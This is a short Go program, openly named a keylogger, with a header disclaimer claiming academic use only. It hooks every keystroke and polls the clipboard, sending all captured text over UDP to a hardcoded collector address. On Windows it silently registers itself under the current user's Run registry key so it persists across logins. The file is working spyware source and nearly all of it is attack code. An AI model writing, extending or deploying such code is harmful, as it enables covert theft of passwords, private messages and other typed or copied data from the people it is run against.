// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

package main

import (
	"fmt"
	"github.com/atotto/clipboard"
	hook "github.com/robotn/gohook"
	"golang.org/x/sys/windows/registry"
	"net"
	"os"
	"runtime"
)

const (
	Protocol = "udp"
	Address  = "127.0.0.1:8722"

	KeyName = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	AppName = "Keylogger"

	OSWindows = "windows"
	OSLinux   = "linux"
	OSDarwin  = "darwin"
)

var conn net.Conn

func init() {
	var err error
	conn, err = net.Dial(Protocol, Address)
	if err != nil {
		return
	}
}

func main() {
	defer conn.Close()
	setAutoStart()
	go listenClipboard()
	go listenKeyboard()
	select {}
}

func setAutoStart() {
	switch runtime.GOOS {
	case OSWindows:
		filename := os.Args[0]
		key, _ := registry.OpenKey(registry.CURRENT_USER, KeyName, registry.ALL_ACCESS)
		defer key.Close()
		path, _, _ := key.GetStringValue(AppName)
		if path != filename {
			_ = key.SetStringValue(AppName, filename)
		}
	case OSLinux:
		// TODO: Register autostart on Linux
	case OSDarwin:
		// TODO: Register autostart on Mac OS
	default:
		// Does not support other platforms
	}
}

func listenClipboard() {
	var text string
	for {
		t, _ := clipboard.ReadAll()
		if t != text && t != "" {
			text = t
			conn.Write([]byte(text))
		}
	}
}

func listenKeyboard() {
	evChan := hook.Start()
	defer hook.End()
	for ev := range evChan {
		if ev.Kind == hook.KeyDown {
			conn.Write([]byte(fmt.Sprintf("%c", ev.Keychar)))
		}
	}
}
